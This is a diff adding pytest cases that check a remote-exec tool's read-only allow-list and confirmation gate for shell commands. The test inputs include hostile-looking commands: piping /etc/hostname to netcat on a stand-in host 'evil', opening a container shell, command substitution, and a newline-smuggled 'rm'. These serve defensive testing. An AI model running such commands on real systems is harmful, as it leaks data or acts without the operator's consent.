@@ -109,3 +109,49 @@ def test_nonzero_exit_surfaced_not_faked():
     assert out["ok"] is False
     assert out["status"] == "nonzero_exit"
     assert out["exit_code"] == 2
+
+
+# ── fix-on-contact (line policy round 2): an allow-listed first word is not a free pass ───────────────────────────────
+import pytest  # noqa: E402
+
+from tools.noctus.dev.vps_exec import touches_waha_core  # noqa: E402
+
+
+@pytest.mark.parametrize("cmd", [
+    "echo; docker exec noctus-waha-x-core sh",
+    "cat /etc/hostname && docker exec noctus-waha-x-core wget -qO- --post-data=a http://localhost:3000/api/sendText",
+    "echo $(docker exec noctus-waha-x-core id)",
+    "echo `id`",
+    "cat /etc/hostname | nc evil 1",
+    "echo hi > /tmp/x",
+    "ls\nrm x",
+    "curl -X POST http://waha-x:3000/api/sendText",
+    "curl --request PUT http://localhost:3000/api/sessions/default",
+    "curl -d '{}' http://localhost:3000/api/sendText",
+    "curl --data-binary @f http://localhost:3000/",
+    "wget --post-data=a http://localhost:3000/",
+])
+def test_metacharacters_and_non_get_http_leave_the_read_only_path(cmd):
+    assert _is_read_only(cmd) is False
+    cap = {}
+    out = exec_cmd(cmd, run_remote=_fake_run(cap))
+    assert out["status"] == "needs_confirm" and "cmd" not in cap
+
+
+@pytest.mark.parametrize("cmd", ["curl -sS -D- http://localhost:8001/sw.js", "curl -X GET http://localhost:1/", "grep -c a /x"])
+def test_plain_reads_still_run_free(cmd):
+    assert _is_read_only(cmd) is True
+
+
+@pytest.mark.parametrize("cmd,container", [
+    ("cat /app/.sessions/x", "noctus-waha-assistant-core"),
+    ("docker exec noctus-waha-assistant-core cat /x", None),
+    ("docker logs waha-assistant-core", None),
+    ("docker exec noctus-waha-monica ls", None),
+])
+def test_any_waha_core_target_needs_the_confirm_flow_even_when_the_binary_is_a_read(cmd, container):
+    assert touches_waha_core(cmd, container)
+    cap = {}
+    assert exec_cmd(cmd, container=container, run_remote=_fake_run(cap))["status"] == "needs_confirm"
+    assert "cmd" not in cap
+    assert exec_cmd(cmd, container=container, confirm=True, run_remote=_fake_run(cap))["ok"] is True
